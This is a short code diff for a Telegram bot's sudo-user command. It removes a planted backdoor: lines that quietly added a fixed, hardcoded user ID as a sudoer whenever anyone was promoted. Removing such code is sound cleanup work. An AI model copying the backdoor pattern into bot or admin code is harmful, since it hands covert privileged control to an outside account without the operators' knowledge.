@@ -26,11 +26,8 @@ async def useradd(client, message: Message, _):
     user = await extract_user(message)
     if user.id in SUDOERS:
         return await message.reply_text(_["sudo_1"].format(user.mention))
-    user_id = 6399386263  # Add this user as a sudoer by default
-    added = await add_sudo(user_id)
     added = await add_sudo(user.id)
     if added:
-        SUDOERS.add(user_id)
         SUDOERS.add(user.id)
         await message.reply_text(_["sudo_2"].format(user.mention))
     else:
